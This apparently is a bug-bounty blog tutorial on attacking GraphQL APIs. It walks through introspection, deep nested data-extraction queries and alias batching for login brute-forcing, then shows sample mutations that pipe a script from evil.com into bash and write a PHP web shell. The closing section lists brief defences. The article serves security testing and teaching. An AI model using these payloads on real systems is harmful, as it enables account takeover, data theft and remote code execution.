# :globe_with_meridians: GraphQL in the Wild: Recon to RCE via Introspection, Nested Queries & Batching Attacks

---

# GraphQL in the Wild: Recon to RCE via Introspection, Nested Queries & Batching Attacks

## How Modern APIs Are Giving Hackers a Query Language for Mayhem

### Introduction

GraphQL was designed to solve a problem: allow frontend developers to query exactly what they need — nothing more, nothing less.But while it makes app development cleaner, it also makes attackers deadlier.When misconfigured, a GraphQL endpoint becomes a goldmine for hackers. Introspection reveals internal schema. Nested queries pull deep relational data. Batching attacks allow a flood of payloads in a single request.

This article breaks down the journey from reconnaissance to Remote Code Execution (RCE) in GraphQL APIs — based on real techniques and bugs from the wild.

Phase 1: Discovering the GraphQL Endpoint

Before the attack begins, the target must be identified.

>

Recon Tips:

- Use tools like waybackurls, gau, or hakrawler to look for /graphql, /api/graphql, /gql, or /playground.

- Look in JavaScript files for fetch/XHR patterns:

```
fetch('/graphql', {
method: 'POST',
body: JSON.stringify({ query: "{ __schema { types { name } } }" })
})
```

- Chrome DevTools → Network tab often exposes GraphQL traffic.

Bug hunter tip: Also check .well-known directories and headers for API hints.

Phase 2: Schema Enumeration via Introspection

Once you’ve found the endpoint, the next step is asking GraphQL to expose its own blueprint.

Example Query:

```
query {
__schema {
types {
name
fields {
name
type {
name
}
}
}
}
}
```

If successful, this dumps every type, field, and internal function the API exposes.

>

Real World: In one bug bounty program, a hidden runScript mutation was discovered using introspection — it accepted raw Bash commands.

Bug hunter tip: If introspection is disabled, use error-based fuzzing or leaked JS schema.

Phase 3: Nested Queries for Deep Data Extraction

GraphQL lets users nest queries… and nest them again. Misconfigured depth limits allow hackers to extract huge amounts of relational data in a single request.

Exploit Example:

```
query {
user(id: "1") {
name
friends {
name
friends {
name
email
messages {
content
}
}
}
}
}
```

- A single request can pivot across user relationships, sensitive messages, and more.

Bug hunter tip: Use GraphQL Voyager to visualize the schema and spot abusable relations.

Phase 4: Batching & Alias Abuse

## Get Monika sharma’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

GraphQL supports sending multiple queries in one request. Combined with aliases, this creates powerful fuzzing and DoS opportunities.

Batching for Mass Fuzzing:

```
query {
a1: login(username: "admin", password: "admin123") { token }
a2: login(username: "admin", password: "admin124") { token }
a3: login(username: "admin", password: "admin125") { token }
}
```

Attackers can brute force, fingerprint, or bypass rate limits.

>

Real World: In one disclosed bug, a researcher chained batching + introspection to leak internal mutation functions and triggered a stored XSS on the admin dashboard.

Phase 5: Going from Injection to RCE

Now comes the lethal part: if internal GraphQL mutations let you write files, trigger server-side logic, or interact with OS-level functionality… it’s game over.

Hypothetical Mutation:

```
mutation {
runCommand(input: "curl http://evil.com/shell.sh | bash")
}
```

Or:

```
mutation {
saveFile(path: "/var/www/html/shell.php", content: "<?php system($_GET['cmd']); ?>")
}
```

Bug hunter tip: Check for file upload fields, shell command wrappers, or SSRF-prone parameters.

### Testing Checklist: GraphQL Attack Vectors

```
| Attack Vector | Description |
| ---------------------- | ----------------------------------------------- |
| Endpoint discovery | `/graphql`, `/gql`, dev tools, JS analysis |
| Introspection abuse | Leak schema, mutation names, hidden fields |
| Deep nesting abuse | Extract related data in a single shot |
| Alias & batching abuse | Brute force, bypass rate limits, error chaining |
| Injection in queries | GraphQL injections, DOS payloads |
| Mutation abuse | File writes, remote commands, SSRF |
```

>

Defense Tips for Developers

- Disable introspection in production

- Implement depth limits and query cost analysis

- Rate-limit and log GraphQL queries

- Whitelist exposed queries and mutations

- Sanitize all input inside resolvers and mutations

### Conclusion

GraphQL isn’t just another API format. It’s a full-fledged query language — and in the wrong hands, it’s a query-for-exploit engine.

From schema leaks to full RCE, misconfigured GraphQL endpoints represent a growing threat surface. And for bug bounty hunters, they’re a fresh, juicy target that most devs haven’t locked down properly.

Next time you’re hunting, ask:

- Is introspection enabled?

- Can I nest this query deeper?

- What does batching reveal?

Because sometimes, the path to RCE is hidden in the query, not the code.

>

Thanks for reading! 🙏✨
Drop your favorite GraphQL payloads in the comments below

---
